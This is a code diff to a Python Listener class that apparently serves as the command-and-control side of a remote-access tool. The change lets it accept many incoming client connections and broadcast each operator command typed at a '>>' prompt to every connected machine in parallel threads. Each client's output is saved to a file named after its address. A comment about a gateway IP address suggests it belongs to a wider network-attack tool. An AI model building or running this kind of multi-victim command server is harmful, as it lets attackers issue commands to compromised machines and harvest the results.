@@ -11,23 +11,45 @@ class Listener:
         self.sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sd.bind(('', port))
         self.sd.listen(10)
-        #Waiting for requests
-        self.client_sd, self.client_address = self.sd.accept()
+        self.mutex = threading.Lock()
 
-    def run(self):
+    def command(self):
         while True:
             command = input(">> ")
-            self.client_sd.send(command.encode())
+                
+            t_list = []
 
-            size = ''
-            while True:
-                size += self.client_sd.recv(1).decode('utf-8','ignore')
+            for client_sd in list(self.CLIENTS.keys()):
+                t = threading.Thread(target=self.execute_client, args=(client_sd, command))
+                t_list.append(t)
+                t.start()
 
-                if size.endswith('\r\n'):
-                    break
+            for t in t_list:
+                t.join()
 
-            result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
-            print(result)
+    def execute_client(self, client_sd, command):
+        client_sd.send(command.encode())
+        x = client_sd.recv(1024).decode('utf-8','ignore')
+
+        with open(f'{self.CLIENTS[client_sd][0]}.txt','w') as f:
+            f.write(x)
+
+
+    def run(self):
+        cmd = threading.Thread(target=self.command)
+        cmd.start()
+
+        while True:
+            #Waiting for requests
+            client_sd, client_address = self.sd.accept()
+
+            self.mutex.acquire()
+            try:
+                self.CLIENTS[client_sd]=client_address
+            finally:
+                self.mutex.release()
+
+        cmd.join()
 
 '''
 Error raised if the user doesn't specify a valid gateway IP address
